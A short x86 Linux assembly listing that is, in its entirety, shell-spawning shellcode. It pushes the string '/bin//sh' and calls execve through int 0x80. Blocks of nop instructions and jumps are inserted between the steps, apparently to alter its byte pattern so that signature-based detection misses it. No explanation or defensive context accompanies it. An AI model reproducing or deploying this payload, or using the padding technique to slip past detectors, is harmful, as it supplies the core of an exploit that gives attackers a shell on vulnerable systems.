xor eax,eax
push eax
push 0x68732f2f
jmp .l1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
.l1:
push 0x6e69622f
mov ebx,esp
mov edx,eax
jmp .l2
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
.l2:
mov al,0xb
int 0x80
